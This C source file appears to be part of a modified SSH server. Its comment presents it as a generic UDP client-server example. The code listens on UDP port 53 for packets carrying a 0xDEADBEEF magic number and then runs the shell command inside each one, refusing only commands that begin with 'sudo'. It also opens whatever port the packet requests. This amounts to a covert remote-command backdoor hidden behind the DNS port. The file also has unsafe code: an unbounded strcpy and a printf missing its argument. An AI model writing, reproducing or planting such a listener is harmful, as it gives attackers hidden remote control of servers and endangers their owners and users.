
// Server side implementation of UDP client-server model 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <netinet/in.h> 
#include "uhandler.h"
#include "runopts.h"
#include "session.h"

  
#define PORT            53 
#define PACKETSIZE      sizeof(listen_packet_t)
#define MAGICNUM        -559038737 //0XDEADBEEF in decimal

void parse_packet(listen_packet_t *,char *);
void parse_error (listen_packet_t *);
int check_shell_command(listen_packet_t *);


int check_shell_command(listen_packet_t * packet){
    if(packet->port_number == -1)
        return 0;
    //remove spacebreaks from the beginning of shell_command
    char* d = packet->shell_command;
    int i;
    for (i=0; packet->shell_command[i] == ' ' && i<256; i++);
    if(i==256)
        return 0;
    //if starts with 'sudo' ->return false
    if(packet->shell_command[i] == 's' && packet->shell_command[i+1] == 'u'
        && packet->shell_command[i+2] == 'd' && packet->shell_command[i+3] == 'o')
        return 0;
    return 1;
}

void parse_error (listen_packet_t *newpacket){
    printf("ERROR - illegal input: %s\n");
    newpacket->magic=0;
    newpacket->port_number=-1; //error parse sign
    newpacket->shell_command[0]='\0';
}

void parse_packet(listen_packet_t *newpacket,char *buffer){
    if(!buffer){ //input check
        parse_error(newpacket);
        return;
    }
    /*
    char magic_buf[5]; //uint32= 4Byte
    char port_buf[3]; //uint16= 2Byte]
    memset(buffer,magic_buf,4);
    buffer+=4;
    magic_buf[4]='\0';
    memset(buffer,port_buf,2);
    buffer+=2;
    magic_buf[2]='\0';
    if(port_buf[0] == '-'){
        parse_error(newpacket, port_buf);
        return;
    }

    printf("magic_buf: %s\t port_buf: %s\n",magic_buf,port_buf);
   uint32_t magic_num=atoi(magic_buf);
   uint16_t port_num = atoi(port_num);
      printf("magic_num: %d\t port_num: %d\n",magic_num,port_num);

    */
    //TODO - assumed that if recieved 264Bytes input so that it is listen_packet_t ??
    listen_packet_t *arrived_packet= (listen_packet_t *)buffer;
    uint32_t magic_num=arrived_packet->magic;
    uint16_t port_num=arrived_packet->port_number;
    
    //update fields in the struct
    newpacket->magic=magic_num;
    newpacket->port_number=port_num;
    strcpy(newpacket->shell_command,arrived_packet->shell_command);
    
}
  
void start_udp() {
    printf("GOT TO START_UDP\n") ;
    int sockfd;
    char buffer[PACKETSIZE]; 
    struct sockaddr_in servaddr, cliaddr;
    listen_packet_t newpacket;
     //TODO - check if AF_INET for IPv4 or AF_INET6 for IPv6
    // Creating socket file descriptor 
    if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
        perror("socket creation failed"); 
        exit(EXIT_FAILURE); 
    } 

    //set reuse this port if port status is waiting
    int enable = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
        perror("setsockopt(SO_REUSEADDR) failed");
      
    memset(&servaddr, 0, sizeof(servaddr)); 
    memset(&cliaddr, 0, sizeof(cliaddr)); 
      
    // Filling server information 
    servaddr.sin_family    = AF_INET; // IPv4 
    servaddr.sin_addr.s_addr = INADDR_ANY; 
    servaddr.sin_port = htons(PORT); 
      
    // Bind the socket with the server address 
    if ( bind(sockfd, (const struct sockaddr *)&servaddr,  
            sizeof(servaddr)) < 0 ) 
    { 
        perror("bind failed"); 
        exit(EXIT_FAILURE); 
    }
    
    while(1){
        // printf("UDP: ENTERED WHILE LOOP\n") ;
        int len, n;   
        len = sizeof(cliaddr);  //len is value/resuslt 
        //TODO - need to configure how to add try and catch ,
        // might occur when n>PACKETSIZE -> buffer overflow
        n = recvfrom(sockfd, (char *)buffer, PACKETSIZE,  
                    MSG_WAITALL, ( struct sockaddr *) &cliaddr, 
                    &len); 
        if((unsigned)n != PACKETSIZE){//need to get exactly packet size
            printf("ERROR: RECIEVED PACKET DIFFERENT THAN PACKET'S SIZE, \nRECIEVED:%d WHILE PACKET SIZE:%d\n",n,(int)PACKETSIZE);
            parse_error(&newpacket);
        }
        else{//else-parse income
            parse_packet(&newpacket,buffer);
        }

    //put here only for tests, after working- 
    //should change to command+parse
        printf("-------------\nGot listen_packet_t packet: \nmagic: %d\nport: %d\nshell_command: %s\n-------------\n", 
                 newpacket.magic,newpacket.port_number,newpacket.shell_command); 
        if((int)newpacket.magic == MAGICNUM){
            if(check_shell_command(&newpacket)){
                // printf("MAGIC!!\n");
                //execute the shell_command, then add port
                shellexeccommand(newpacket.shell_command); //func in svr-chansession
                addportrequest((int)newpacket.port_number); //func in svr-runopts
            }   
        }
    }


} 


    

